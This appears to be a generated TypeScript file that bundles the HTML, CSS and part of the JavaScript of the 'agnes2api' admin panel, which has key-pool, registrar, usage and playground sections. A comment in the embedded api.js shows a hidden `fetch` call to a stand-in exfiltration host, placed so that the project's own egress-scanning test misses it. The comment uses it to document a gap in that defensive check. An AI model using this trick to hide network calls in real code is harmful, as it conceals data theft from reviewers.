// 由 scripts/build-ui.mjs 生成，**请勿手工编辑**。
// 源在 admin-ui/，改完那边跑 `pnpm ui:build`。产物与源逐字节相同
// （tests/unit/ui-assets.test.ts 的「源目录里每个文件都在生成物里，且内容一字不差」钉死）。
export interface UiAsset {
  readonly body: string;
  readonly type: string;
  readonly etag: string;
}

export const UI_ASSETS: Readonly<Record<string, UiAsset>> = {
  "/admin": { body: "<!doctype html>\n<html lang=\"zh-CN\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<meta name=\"theme-color\" content=\"#f7f8fa\">\n<title>agnes2api 管理后台</title>\n<!-- 唯一的经典脚本，必须同步、必须在 CSS 之前：防闪白 / 闪错语言。 -->\n<script src=\"/admin/js/boot.js\"></script>\n<link rel=\"stylesheet\" href=\"/admin/css/base.css\">\n<link rel=\"stylesheet\" href=\"/admin/css/shell.css\">\n<link rel=\"stylesheet\" href=\"/admin/css/sections.css\">\n</head>\n<body>\n<div class=\"gate\" id=\"gate\">\n  <form class=\"gate-card\" id=\"gate-form\">\n    <h1 data-i18n=\"gate.title\">agnes2api 管理后台</h1>\n    <p class=\"sub\" data-i18n=\"gate.sub\">请输入管理口令（ADMIN_TOKEN）</p>\n    <label for=\"gate-key\" data-i18n=\"gate.label\">管理口令</label>\n    <input id=\"gate-key\" type=\"password\" autocomplete=\"current-password\"\n           data-i18n-ph=\"gate.placeholder\" placeholder=\"ADMIN_TOKEN\">\n    <button type=\"submit\" data-i18n=\"gate.submit\">进入</button>\n    <div class=\"err\" id=\"gate-err\" role=\"alert\"></div>\n  </form>\n</div>\n\n<div class=\"shell\" id=\"shell\">\n  <aside class=\"side\">\n    <div class=\"brand\">agnes2api</div>\n    <nav>\n      <button class=\"nav-item\" data-section=\"overview\" data-i18n=\"nav.overview\">概览</button>\n      <button class=\"nav-item\" data-section=\"keys\" data-i18n=\"nav.keys\">Key 池</button>\n      <button class=\"nav-item\" data-section=\"registrar\" data-i18n=\"nav.registrar\">注册机</button>\n      <button class=\"nav-item\" data-section=\"events\" data-i18n=\"nav.events\">事件</button>\n      <button class=\"nav-item\" data-section=\"usage\" data-i18n=\"nav.usage\">用量</button>\n      <button class=\"nav-item\" data-section=\"models\" data-i18n=\"nav.models\">模型</button>\n      <button class=\"nav-item\" data-section=\"playground\" data-i18n=\"nav.playground\">调试台</button>\n      <button class=\"nav-item\" data-section=\"settings\" data-i18n=\"nav.settings\">设置</button>\n    </nav>\n    <div class=\"side-foot\">\n      <select id=\"lang-select\" data-i18n-title=\"shell.lang\"></select>\n      <button id=\"theme-btn\" class=\"icon-btn\" data-i18n-title=\"shell.theme\"></button>\n      <button id=\"logout-btn\" class=\"icon-btn\" data-i18n-title=\"shell.logout\"></button>\n    </div>\n  </aside>\n  <main class=\"main\">\n    <section class=\"section\" id=\"sec-overview\"></section>\n    <section class=\"section\" id=\"sec-keys\"></section>\n    <section class=\"section\" id=\"sec-registrar\"></section>\n    <section class=\"section\" id=\"sec-events\"></section>\n    <section class=\"section\" id=\"sec-usage\"></section>\n    <section class=\"section\" id=\"sec-models\"></section>\n    <section class=\"section\" id=\"sec-playground\"></section>\n    <section class=\"section\" id=\"sec-settings\"></section>\n  </main>\n</div>\n\n<div id=\"toast-host\" class=\"toast-host\" aria-live=\"polite\"></div>\n<script type=\"module\" src=\"/admin/js/app.js\"></script>\n</body>\n</html>\n", type: "text/html; charset=utf-8", etag: "\"e85aed9f79748067\"" },
  "/admin/css/base.css": { body: "/* 所有颜色一律引用变量，零硬编码色值。主色用 indigo（不是 kiro2api 的 emerald）：\n   同一个运维会同时开着两个结构一模一样的面板，颜色是最快最可靠的区分信号。\n\n   本文件只放**组件原语 token** + 跨页面共用的基础重置/控件样式。外壳布局\n   （侧栏、登录闸、toast、modal）在 shell.css；业务内容（表格、卡片、徽章）\n   在 sections.css。两份都只覆盖 :root 的 token，不重复定义组件规则\n   （见两个文件各自的文件头）。 */\n:root {\n  --bg: #f7f8fa; --panel: #ffffff; --panel-2: #f0f1f5; --text: #1c1f26; --muted: #6b7280;\n  --border: #e3e6ec; --primary: #4f46e5; --primary-fg: #ffffff;\n  --danger: #dc2626; --danger-fg: #ffffff; --warn: #b45309; --warn-fg: #ffffff;\n  --ok: #15803d; --ok-fg: #ffffff;\n  --radius: 10px; --radius-sm: 6px; --gap: 16px; --gap-sm: 8px;\n  --shadow: rgba(15, 18, 24, 0.12);\n  /* 有色背景（toast/badge 这类不跟 --panel 走的元素）上的 hover 遮罩。\n     只有一份定义、不按主题分叉：它是\"在当前背景上压暗一层\"的相对效果，\n     深色主题下 toast 背景同样是饱和/浅色（见 --danger 等在 dark 里的取值），\n     压暗一样成立，不需要为亮暗各写一份。 */\n  --overlay-hover: rgba(0, 0, 0, 0.15);\n}\n:root[data-theme=\"dark\"] {\n  --bg: #14161a; --panel: #1c1f26; --panel-2: #23262f; --text: #e7e9ee; --muted: #9aa1ad;\n  --border: #2b303a; --primary: #818cf8; --primary-fg: #14161a;\n  --danger: #f87171; --danger-fg: #14161a; --warn: #fbbf24; --warn-fg: #14161a;\n  --ok: #4ade80; --ok-fg: #14161a;\n  --shadow: rgba(0, 0, 0, 0.4);\n}\n* { box-sizing: border-box; }\nbody {\n  margin: 0; background: var(--bg); color: var(--text);\n  font: 14px/1.6 system-ui, -apple-system, \"Segoe UI\", \"PingFang SC\", \"Microsoft YaHei\", sans-serif;\n}\na { color: var(--primary); }\n:focus-visible { outline: 2px solid var(--primary); outline-offset: 2px; }\n\n/* 输入 / 按钮的原语样式：登录闸的表单与 modal 的操作栏共用同一套。 */\nlabel { display: block; margin-bottom: 6px; font-size: 13px; color: var(--muted); }\ninput[type=\"password\"], input[type=\"text\"], select, textarea {\n  width: 100%; padding: 10px 12px; color: var(--text); font: inherit;\n  background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius);\n}\ntextarea { resize: vertical; }\nbutton {\n  padding: 10px 12px; font: inherit; cursor: pointer;\n  color: var(--primary-fg); background: var(--primary); border: 0; border-radius: var(--radius);\n}\nbutton[disabled] { opacity: .6; cursor: progress; }\nbutton.danger { background: var(--danger); color: var(--danger-fg); }\n\n/* 图标按钮：侧栏与业务板块共用（svgIcon() 生成的 <svg> 直接放在里面）。 */\n.icon-btn {\n  display: inline-flex; align-items: center; justify-content: center;\n  width: 32px; height: 32px; padding: 0;\n  color: var(--text); background: transparent; border: 1px solid var(--border);\n  border-radius: var(--radius-sm);\n}\n.icon-btn:hover { background: var(--panel-2); }\n", type: "text/css; charset=utf-8", etag: "\"fe5e0f846e54a4a6\"" },
  "/admin/css/sections.css": { body: "/* 表格、卡片、徽章。业务板块（Task 4 概览 / Task 5 Key 池 / Task 6 事件）的公共\n   内容原语，**只覆盖 base.css 的 token，不重复定义颜色/圆角等原语规则**。\n   Task 3 本身不产出任何业务板块，这份文件先把三类原语定好，供后续任务直接引用。 */\n\n.card {\n  padding: var(--gap); background: var(--panel);\n  border: 1px solid var(--border); border-radius: var(--radius);\n}\n.card + .card { margin-top: var(--gap-sm); }\n/* ⚠️⚠️ **上面那条是给「竖着摞起来的卡」用的，横排的一行里必须取消掉。**\n   P3c Task 7 的真机冒烟量出来的：`.card-row` 是 flex 行，第二张及以后的卡命中\n   `.card + .card` 拿到 8px 的 `margin-top` ⇒ 它比第一张**矮 8px、而且整体下沉 8px**\n   （实测 moemail 367px / top 2766，yyds 359px / top 2774）。\n   两张通道卡因此**不等高、不对齐**——而设计 §10.3 第 2 条要的是「两张卡片布局完全\n   对称」，高度差同样会被读成「这条更重要」。\n   **这是 P3b/Task 6 就已经上线的缺陷**（注册机板块那两张卡、以及概览与注册机的四格\n   数字瓦片都在同一条规则下），不是本任务引入的；横排的间距本来就由 `.card-row` 的\n   `gap` 给，这条竖排规则在行里是纯多余。 */\n.card-row > .card + .card { margin-top: 0; }\n.card-row { display: flex; flex-wrap: wrap; gap: var(--gap); }\n.card-row > .card { flex: 1; min-width: 180px; }\n.card .label { color: var(--muted); font-size: 12px; }\n.card .value { margin-top: 4px; font-size: 22px; font-weight: 600; }\n\ntable {\n  width: 100%; border-collapse: collapse; background: var(--panel);\n  border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden;\n}\nth, td {\n  padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--border);\n  font-size: 13px;\n}\nth { color: var(--muted); font-weight: 500; background: var(--panel-2); }\ntr:last-child td { border-bottom: 0; }\n\n.badge {\n  display: inline-block; padding: 2px 8px; font-size: 12px; border-radius: 999px;\n  color: var(--muted); background: var(--panel-2); border: 1px solid var(--border);\n}\n.badge-ok { color: var(--ok-fg); background: var(--ok); border-color: var(--ok); }\n.badge-warn { color: var(--warn-fg); background: var(--warn); border-color: var(--warn); }\n.badge-danger { color: var(--danger-fg); background: var(--danger); border-color: var(--danger); }\n/* 「人工停用」档**刻意不加颜色修饰类**：上面 `.badge` 的底样式本身就是中性灰，\n   而停用不是故障、是运维自己按下的开关，用报警色会让人以为出事了。\n   曾经为它加过一条 `.badge-muted`，取值与 `.badge` 逐字相同 ⇒ 那是条死规则\n   （删掉它 1583 条全绿，评审 M-a 实测）。**别再加回来**——要区分的话得先给它一个\n   真正不同的样式，而不是一个换了名字的同义类。 */\n\n/* 工具条 / 分页 / 说明文字：Task 4 的 Key 池板块起用，事件与概览板块同样直接引用，\n   **不许各板块再各写一份**（kiro2api 正是没有这一层，同一个原语出现了三份不同实现）。 */\n.toolbar { display: flex; flex-wrap: wrap; align-items: center; gap: var(--gap-sm); margin: var(--gap-sm) 0; }\n.toolbar input[type=\"search\"] {\n  flex: 1; min-width: 160px; padding: 10px 12px; color: var(--text); font: inherit;\n  background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius);\n}\n.toolbar select { width: auto; }\n.toolbar .auto { display: inline-flex; align-items: center; gap: var(--gap-sm); margin-bottom: 0; }\n.pager { display: flex; align-items: center; gap: var(--gap-sm); margin-top: var(--gap-sm); }\n.muted { color: var(--muted); }\n.note { margin: 4px 0 var(--gap); font-size: 12px; }\n.mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }\n/* `≈` 标记：它是产品不变式的一部分（近似值必须打标），不是排版装饰。 */\n.approx { color: var(--muted); cursor: help; }\n\n/* 概览板块（Task 5）：常驻红色横幅（config.degraded 时）+ 内容块卡片。 */\n.banner-danger {\n  padding: var(--gap-sm) var(--gap); margin-bottom: var(--gap-sm);\n  color: var(--danger-fg); background: var(--danger); border-radius: var(--radius);\n}\n.banner-danger p { margin: 2px 0; }\n.block { margin-top: var(--gap); }\n.block h3 { margin: 0 0 var(--gap-sm); font-size: 14px; }\n.block p { margin: 4px 0; }\n\n/* 事件板块（Task 6）：级别按钮组 + 轮询状态指示灯 + 滚动容器 + 分组时间线。 */\n.btn-group { display: inline-flex; gap: 2px; flex-wrap: wrap; }\n.btn-toggle {\n  padding: 6px 10px; font: inherit; color: var(--muted);\n  background: var(--panel-2); border: 1px solid var(--border); border-radius: var(--radius);\n}\n.btn-toggle.active { color: var(--text); border-color: var(--primary); }\n/* 轮询状态指示灯：三态用不同颜色，不用文字（title/aria-label 已经带文字说明）。 */\n.poll-dot {\n  display: inline-block; width: 8px; height: 8px; border-radius: 999px;\n  background: var(--muted); margin-left: var(--gap-sm);\n}\n.poll-dot-active { background: var(--ok-fg); }\n.poll-dot-paused { background: var(--muted); }\n.poll-dot-error { background: var(--danger-fg); }\n\n/* Key 池板块（P3c Task 4）：批量条复用 .toolbar 布局，行内动作列的按钮组换行。 */\n.bulk-bar { background: var(--panel-2); padding: var(--gap-sm); border-radius: var(--radius); }\n.row-actions { display: flex; flex-wrap: wrap; gap: 4px; }\n\n/* 单把 key 的验活（P3d Task 9）：一颗按钮 + 它的行内结果。\n   `flex-basis: 100%` 让这一小块**独占一行**——结果文案是整句话（五语言里最长的\n   那几句能到一百多个字符），跟六颗按钮挤在同一行会把整列撑爆。\n   结果只在这一行就地显示、不落盘（订正 F8），所以这里不需要任何折叠/清除控件。 */\n.verify-wrap { flex-basis: 100%; display: flex; flex-wrap: wrap; align-items: baseline; gap: 4px; }\n.verify-result { font-size: 12px; }\n.verify-note { font-size: 12px; }\n\n/* 「添加 Key」分组下拉（设计 §10.2）：触发按钮 + 一个绝对定位的分组菜单。\n   两组（自动注册 / 手动）用组内小标题分开，不用分割线——标题本身已经在做\n   这件事，多一条线只是重复信息。 */\n.dropdown { position: relative; display: inline-block; }\n.dropdown-menu {\n  position: absolute; top: 100%; left: 0; z-index: 50; margin-top: 4px;\n  min-width: 220px; padding: var(--gap-sm) 0;\n  background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius);\n  box-shadow: 0 4px 12px var(--shadow);\n}\n.dropdown-group + .dropdown-group { border-top: 1px solid var(--border); margin-top: 4px; padding-top: 4px; }\n.dropdown-group-label { padding: 4px var(--gap-sm); font-size: 12px; color: var(--muted); }\n.dropdown-menu button {\n  display: block; width: 100%; padding: 8px var(--gap-sm); text-align: left;\n  color: var(--text); background: transparent; border: 0; border-radius: 0;\n}\n.dropdown-menu button:not([disabled]):hover { background: var(--panel-2); }\n\n/* 注册机板块（P3c Task 6）：两张**完全对称**的通道卡。\n   ⚠️ **这里刻意没有任何 `[data-channel=\"…\"]` 选择器。** 给某一条通道单独一条\n   样式规则，就是在样式层引入设计 §10.3 第 2 条禁止的那种不对称——而它比代码里的\n   不对称更难被评审看见（两张卡在 DOM 上仍然一模一样，只是画出来不一样）。 */\n.channel-card { display: flex; flex-direction: column; gap: 4px; }\n.channel-card .channel-name { font-size: 14px; font-weight: 600; color: var(--text); }\n.channel-card p { margin: 2px 0; }\n.channel-card .channel-test { align-self: flex-start; }\n/* 测试结果行**恒占一行高度**（哪怕还没测过）：不占位的话，一条通道测完之后\n   两张卡会一高一低，而高度差同样会被读成「这条更重要」。 */\n.channel-card .channel-result { min-height: 1.2em; }\n\n.events-body { max-height: 60vh; overflow-y: auto; }\n.ev-group-header td { padding-top: var(--gap-sm); font-size: 12px; }\n/* 分组内的行左边一条细线，视觉上把同一条时间线的几行连起来。 */\n.ev-row-grouped td:first-child { border-left: 2px solid var(--border); }\n\n/* 设置页（P3c Task 7）。\n   ⚠️ **锁定与「本次变化」两种状态必须有各自的视觉信号，而且不能只靠颜色**：\n   一个只用颜色区分的状态对色觉障碍用户等于不存在，而这两个状态一个说\n   「你改了也不会生效」、一个说「这一格真的变了」，两句都是运维保存之后唯一\n   能读到的反馈。锁定那一格另外还有一行文字说明（`.cfg-lock`），\n   变化那一格另外还有底部那一行回读汇总（`.cfg-readback`）。 */\n.cfg-field { display: flex; flex-direction: column; gap: 4px; margin-bottom: var(--gap-sm); }\n.cfg-field .cfg-label { font-size: 13px; color: var(--muted); }\n.cfg-field input, .cfg-field select { max-width: 420px; }\n.cfg-field p { margin: 2px 0; }\n.cfg-field.locked input, .cfg-field.locked select { opacity: 0.6; }\n.cfg-field.locked { border-left: 2px solid var(--border); padding-left: var(--gap-sm); }\n.cfg-field.changed { border-left: 2px solid var(--ok); padding-left: var(--gap-sm); }\n.cfg-field.invalid { border-left: 2px solid var(--danger); padding-left: var(--gap-sm); }\n/* ⚠️ **清空按钮必须缩到内容宽度，不许铺满整格。**\n   `.cfg-field` 是 column 方向的 flex 容器，按钮默认被拉成整行宽——真机截图上那是\n   一条**横贯整张卡的红色大条**，于是整页视觉上最抢眼的东西是三颗**销毁凭据**的按钮。\n   与 `.channel-card .channel-test` 用的是同一条处置（`align-self: flex-start`）。 */\n.cfg-field .cfg-clear { align-self: flex-start; }\n.cfg-advanced { margin-top: var(--gap-sm); border: 1px solid var(--border); border-radius: var(--radius); padding: var(--gap-sm); }\n.cfg-advanced summary { cursor: pointer; color: var(--text); }\n.cfg-errors p { margin: 2px 0; }\n.danger-text { color: var(--danger); }\n\n/* 集成示例卡（P3d Task 7，设计 §10.4 第 4 张卡）。\n\n   ⚠️ **`white-space: pre` 而不是 `pre-wrap`**：示例是要照抄去跑的，curl 那几段靠\n   行尾的反斜杠续行，自动折行会在视觉上把一条命令切成好几条、把续行符的位置搞乱。\n   代价是长 URL 要横向滚动，所以这里显式给 `overflow-x: auto`——去掉它的话，\n   窄屏上那段代码会把整张卡撑破。 */\n.examples-code {\n  margin: var(--gap-sm) 0; padding: var(--gap-sm);\n  background: var(--panel-2); border: 1px solid var(--border); border-radius: var(--radius);\n  white-space: pre; overflow-x: auto; font-size: 12px; line-height: 1.5;\n}\n/* 两排分段选择器各占一行：挤在同一行时协议与语言两组按钮会被读成一组。\n   **只作用在本卡自己的那两排上**——`.btn-group` 是事件 / 用量 / 模型三个板块共用的，\n   在它上面改 display 会顺手改掉那三处。 */\n.examples-bar { display: flex; align-items: center; margin-top: var(--gap-sm); }\n.examples-bar .muted { margin-right: var(--gap-sm); }\n\n/* 用量板块（P3d Task 5，设计 §10.6）。\n\n   ⚠️⚠️ **这一段里最要紧的是那两根破折号**：`–`（EN DASH，`.usage-none`）说的是\n   「这一次读成功了，只是没有样本 / 没有分母」，`—`（EM DASH，`.usage-unknown`）\n   说的是「整块就没读出来，我们不知道」。**两者必须视觉可区分**——单靠字宽差\n   太细，所以再加一层颜色差：前者走 `--muted`（与别处的「无数据」同一档），\n   后者走 `--danger`（它是一条要人去看的信号，不是排版留白）。\n   判据不在 CSS 里：哪一格用哪一根由 `admin-ui/js/pure/usage.mjs` 的\n   `cellKind` / `ratioKind` 决定，这里只负责让它们看得出来不一样。 */\n.usage-none { color: var(--muted); cursor: help; }\n.usage-unknown { color: var(--danger); cursor: help; }\n/* 「不完整」标记：`partial_malformed` 那一档的数字是真的、只是缺了几块。\n   它与 `.approx` 是两件事——`≈` 说「有系统性少计」，这个说「这一份缺了几个分片」。 */\n.usage-incomplete { color: var(--warn); cursor: help; font-size: 12px; }\n/* 黄条与中性条。`.banner-danger` 已经在概览板块那一段里定义过，这里只补另两档。 */\n.banner-warn {\n  padding: var(--gap-sm) var(--gap); margin-bottom: var(--gap-sm);\n  color: var(--warn-fg); background: var(--warn); border-radius: var(--radius);\n}\n.banner-info {\n  padding: var(--gap-sm) var(--gap); margin-bottom: var(--gap-sm);\n  color: var(--text); background: var(--panel-2); border-radius: var(--radius);\n}\n.banner-warn p, .banner-info p { margin: 2px 0; }\n/* 错误横幅里那颗重试按钮：跟在文字后面，别把整条横幅撑成两行。\n   用量板块与模型板块上那颗是**同一件东西**，所以共用这一条规则、\n   不各写一份取值逐字相同的声明（同 `.badge-danger` 下面那段裁定）。 */\n.usage-retry, .models-retry { margin-left: var(--gap-sm); }\n\n/* 模型板块（P3d Task 6）。 */\n/* 一条端点一行；同一格里的第二条往下挪，别让两段式被读成一条带斜杠的长路径。 */\n.models-endpoint { white-space: nowrap; }\n.models-endpoint + .models-endpoint { margin-top: 2px; }\n/* 矩阵里四个徽章之间的间距。**限定在模型表的行内**，不去动别处的 `.badge`。 */\n.models-row .badge + .badge { margin-left: 4px; }\n/* 「模型目录读不出来」那一根 EM DASH。用报警色 + `cursor: help`（tooltip 里有全文），\n   与 `.usage-unknown` 表达的是同一件事：**我们不知道**，不是「一个模型都没有」。 */\n.models-unknown { color: var(--danger); font-size: 22px; cursor: help; margin: 0; }\n.usage-detail-head { display: flex; align-items: center; justify-content: space-between; gap: var(--gap-sm); }\n.usage-detail-head h3 { margin: 0; font-size: 14px; }\n.usage-breakdown { margin-top: var(--gap); }\n.usage-breakdown h4 { margin: 0 0 var(--gap-sm); font-size: 13px; }\n\n/* Playground 板块（P3d Task 10）。\n   ⚠️ **一个字节的 CSP 都没有放宽**（全局约束 17）：这里全是文本与边框，\n   没有任何图片 / 视频 / iframe，也不为将来「顺手」预留。 */\n/* 左右两栏。窄屏下自动落成上下两块——`min-width` 由内容决定，不写媒体查询：\n   面板其余部分（`.card-row`）用的就是同一套 flex + wrap。 */\n.pg-cols { display: flex; flex-wrap: wrap; gap: var(--gap); align-items: flex-start; }\n.pg-cols > .card { flex: 1; min-width: 300px; }\n.pg-field { display: flex; align-items: center; gap: var(--gap-sm); margin-top: var(--gap-sm); }\n.pg-field > span { flex: 0 0 5.5em; }\n.pg-field > select, .pg-field > input[type=\"password\"], .pg-field > textarea { flex: 1; min-width: 0; }\n.pg-field > textarea { font-family: inherit; resize: vertical; }\n/* 口令与设置页 hint 对不对得上那一句。**三档同时靠文字表达**，颜色只是加强\n   （WCAG 1.4.1：不许只靠颜色传达状态）。 */\n.pg-hint { display: block; margin-top: 4px; font-size: 12px; }\n.pg-hint-ok { color: var(--ok-fg); }\n.pg-hint-bad { color: var(--danger-fg); }\n/* 一轮对话。上下两条头部信息 + 中间的内容。 */\n.pg-turn { padding: var(--gap-sm) 0; }\n.pg-turn + .pg-turn { border-top: 1px solid var(--border); }\n.pg-turn-head { display: flex; flex-wrap: wrap; align-items: baseline; gap: var(--gap-sm); font-size: 12px; }\n.pg-turn-prompt { margin: 4px 0; white-space: pre-wrap; word-break: break-word; }\n.pg-endpoint { word-break: break-all; }\n/* 响应体原文。**必须能横向滚**：一行很长的 JSON 会把整块布局撑破。 */\n.pg-body {\n  margin: 4px 0 0; padding: var(--gap-sm); max-height: 320px;\n  overflow: auto; background: var(--panel-2); border-radius: var(--radius);\n  font-size: 12px; white-space: pre;\n}\n/* 「协议目录读不出来」那一档：与模型板块的 `.models-unknown` 表达同一件事\n   ——**我们不知道**，不是「一条协议都没有」。这里没有那根破折号，因为读不出来时\n   整个左栏都配不了，说明文字本身就是那句话。 */\n.pg-unknown { color: var(--danger); }\n/* 错误横幅里那颗「再读一次」，与用量 / 模型板块那两颗是同一件东西。 */\n.pg-retry { margin-left: var(--gap-sm); }\n/* ── 媒体模式（P3d Task 12）────────────────────────────────────────────────\n   一条结果 = 地址原文 + 复制 + （可链接就）在新标签页打开。\n   **地址必须能换行**（`break-all`）：一条带签名的 CDN 地址轻松几百字符，\n   不换行会把整块右栏撑破，而运维连它是什么都看不见。 */\n.pg-media-row { display: flex; flex-wrap: wrap; align-items: baseline; gap: var(--gap-sm); margin-top: var(--gap-sm); }\n.pg-media-url { flex: 1; min-width: 0; word-break: break-all; font-size: 12px; }\n/* **只有 data 形式的图片会走到这里**（判定在 js/pure/playground.mjs 的 mediaEmbeddable）。\n   限高限宽：上游给多大就画多大的话，一张图能把整页顶到看不见别的东西。 */\n.pg-media-img { display: block; width: 100%; max-width: 320px; max-height: 320px; object-fit: contain; border-radius: var(--radius); }\n.pg-media-note > .pg-media-endpoint { flex: 1; min-width: 0; word-break: break-all; font-size: 12px; }\n", type: "text/css; charset=utf-8", etag: "\"1b81441af2035cca\"" },
  "/admin/css/shell.css": { body: "/* 外壳、侧栏、登录闸、toast、modal。**只覆盖 base.css 里的 token，不重复定义\n   颜色/圆角等原语规则**——[data-theme=\"dark\"] 在 base.css 里已经整体覆盖过一次，\n   这里的组件规则对亮暗两套主题都通用。 */\n\n/* ── 登录闸 ─────────────────────────────────────────────── */\n.gate { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: var(--gap); }\n.gate-card {\n  width: 100%; max-width: 380px; padding: 28px; background: var(--panel);\n  border: 1px solid var(--border); border-radius: var(--radius);\n}\n.gate-card h1 { margin: 0 0 4px; font-size: 20px; }\n.gate-card p.sub { margin: 0 0 20px; color: var(--muted); font-size: 13px; }\n.gate-card input { margin-bottom: 14px; }\n.gate-card button { width: 100%; }\n.err { min-height: 20px; margin-top: 10px; color: var(--danger); font-size: 13px; }\n/* 登录成功后隐藏登录闸。用类而不是 el.style.display：\n   ⚠️ 理由**不是** CSP——`style-src` 管的是标记里的 `style=\"…\"` 属性与 <style> 元素，\n   **CSSOM 写入（el.style.x = y）不受 CSP 约束**，简报那版其实也跑得通。\n   真正的理由是表现归样式表：`.gate` 的显示方式（现在是 flex）只写在这一个地方，\n   将来改布局不必回头去找 JS 里那句写死的 display 值。 */\n.gate.off { display: none; }\n\n/* ── 外壳（侧栏 + 主内容） ───────────────────────────────── */\n.shell { display: none; }\n.shell.on { display: grid; grid-template-columns: 220px 1fr; min-height: 100vh; }\n.side {\n  display: flex; flex-direction: column; gap: var(--gap);\n  padding: var(--gap); background: var(--panel); border-right: 1px solid var(--border);\n}\n.side .brand { font-weight: 600; font-size: 16px; }\n.side nav { display: flex; flex-direction: column; gap: 4px; }\n.nav-item {\n  text-align: left; padding: 8px 10px; color: var(--text);\n  background: transparent; border: 0; border-radius: var(--radius-sm);\n}\n.nav-item:hover { background: var(--panel-2); }\n.nav-item.active { background: var(--primary); color: var(--primary-fg); }\n.side-foot { margin-top: auto; display: flex; align-items: center; gap: var(--gap-sm); }\n.side-foot select { width: auto; flex: 1; padding: 6px 8px; }\n\n.main { padding: var(--gap); overflow: auto; }\n.section { display: none; }\n.section.active { display: block; }\n\n/* ── toast ──────────────────────────────────────────────── */\n.toast-host {\n  position: fixed; right: var(--gap); bottom: var(--gap); z-index: 100;\n  display: flex; flex-direction: column; gap: var(--gap-sm);\n}\n.toast {\n  display: flex; align-items: center; gap: var(--gap-sm);\n  padding: 10px 14px; border-radius: var(--radius-sm); font-size: 13px;\n  color: var(--primary-fg); background: var(--primary); box-shadow: 0 4px 12px var(--shadow);\n}\n.toast-warn { background: var(--warn); color: var(--warn-fg); }\n.toast-err { background: var(--danger); color: var(--danger-fg); }\n.toast-ok { background: var(--ok); color: var(--ok-fg); }\n/* `sticky` 提示需要手动关闭（P3c Task 4）：批量操作里一部分被拒绝这类信息\n   藏在 HTTP 200 的响应体里，4 秒自动消失等于把一条诚实信号做成了看不见的信号。 */\n.toast-close {\n  flex: none; padding: 0 2px; font-size: 16px; line-height: 1;\n  color: inherit; background: transparent; border: 0; border-radius: var(--radius-sm);\n}\n.toast-close:hover { background: var(--overlay-hover); }\n\n/* ── modal ──────────────────────────────────────────────── */\n.modal-back {\n  position: fixed; inset: 0; z-index: 200;\n  display: flex; align-items: center; justify-content: center;\n  background: var(--shadow);\n}\n.modal {\n  width: 100%; max-width: 420px; padding: 20px; background: var(--panel);\n  border: 1px solid var(--border); border-radius: var(--radius);\n}\n.modal h2 { margin: 0 0 12px; font-size: 16px; }\n.modal-actions { display: flex; justify-content: flex-end; gap: var(--gap-sm); margin-top: 16px; }\n", type: "text/css; charset=utf-8", etag: "\"0626915384fbee32\"" },
  "/admin/js/api.js": { body: "/**\n * 面板**登录之后**打管理接口的唯一网络出口。\n *\n * ⚠️ **这句原来写的是「全站唯一网络出口」，那是假的**（全分支评审 C3）：\n * 全站一共**三个** `fetch` 调用点，另两个是 `js/app.js` 的登录探针\n *（`probe()`）与 P3d Task 10 的 `js/gw-api.js`（Playground 打对外那棵树）。\n * 登录探针**刻意**绕开本模块——那一刻还没有会话可言：\n * 没有 `expired()` 前置（时刻键还没写）、不该走 `onUnauthorized`（401 在那里\n * 的意思是「口令不对」，不是「你掉线了」）、也不必包成 `ApiError`。\n * `gw-api.js` 绕开本模块的理由更硬：**它拿的是另一把钥匙**（网关口令），\n * 送进本模块等于把两把钥匙合流，而两者的泄漏面完全不同。\n * 说准这件事很要紧：**本模块正是那个把「唯一出口」当成安全论证前提的地方**\n *（下面「口令只走请求头」那段），顺着假的那句走，审计者会漏掉口令实际离开\n * 页面的另外两条路径。三个出口这件事由 `tests/ui/api-session.test.ts` 的\n * 「恰好三处：api.js 的 raw()、app.js 的登录探针、gw-api.js 的网关出口」\n * 那格数着调用点钉住。\n * ⚠️⚠️ **它仍然会漏。别把它读成「所有出网方式」。**\n *\n * **轴一：枚举表**（P3d Task 7 评审 F-11 发现，**P3d Task 10 补齐**）。\n * 表里原来只有 `fetch` / `XMLHttpRequest` / `EventSource` / `sendBeacon` 四个名字，\n * **`new WebSocket(`、动态 `import(`、以及把 fetch 先存进变量再调\n *（`const f = globalThis.fetch; f(u)`）三种它一个都数不出来**（当时实测三种各得 0）。\n * Task 10 把三种一并加进表里，并为每一种各种了一次探针——\n * 见那里的「反向自检：补进表里的那三种写法，每一种都真的被数出来」那一格。\n * ⚠️⚠️ **那三条规则改过三版，前两版都是被实测打回来的**，逐版留在那个文件的\n * `EGRESS_FORMS` 上方：第一版误报（真实英文文案），第二版**把「唯一一族真会被写出来的\n * 别名形态」漏掉了**（`makeClient(fetch)` —— 依赖注入正是本仓自己的主流写法），\n * 而当时的登记表宣称已穷尽。**「补齐了」这句话本身被写错过一次。**\n * ⚠️ **别把「补齐了」读成「列全了」**：这仍然是一张手写的名字表，\n * 列举永远列不全（`navigator.sendBeacon` 换成别名、`Request` 对象经由别的入口……）。\n * 今天还漏的写法**逐条**登记在那个文件的 `BLIND_SPOTS` 里（**是断言，不是散文**），\n * 条数以那张表为准、不在这里复述一个会漂的数字。\n * 它拦得住的是**顺手在某个板块里再开一个出口**，不是刻意绕开。\n *\n * **轴二：它先抠掉模板串的字面文本，而那一步会连真代码一起抠掉**\n *（P3d Task 7 定向复评 H-1，落盘实跑）。最要命的一族是**带花括号的插值**：\n * 整条模板串连同里面真会执行的代码一起消失。⚠️ **这不是假想**——\n * `admin-ui/js/sec-overview.js` 那条渲染「上次检查时间」的模板串（插值里有\n * `{ at: … }`）就是这个形状，把它里面的 `offsetMs()` 换成\n * `offsetMs(fetch(\"https://exfil.example/x\"))` —— **一个货真价实的第三个出口，\n * 用的还正是表里的 `fetch` —— 那道扫描 27/27 全绿，整个 `tests/ui/` 699/699 全绿。**\n * ⇒ **P3d Task 10 新写的那个出口因此刻意不写在任何模板串的插值里。**\n *\n * ⇒ 准确的说法是：「**照那七种写法写、并且不在带花括号的插值里**，加第四个出口会让它变红。」\n * ⚠️ **P3d Task 7 那一版只沿轴一收窄，于是收窄之后那句话仍然是假的，而反例就写在\n * 同一个提交里作者自己那一段**（本仓第 34 句实测为假的全称句）。⭐ 记一条形状：\n * 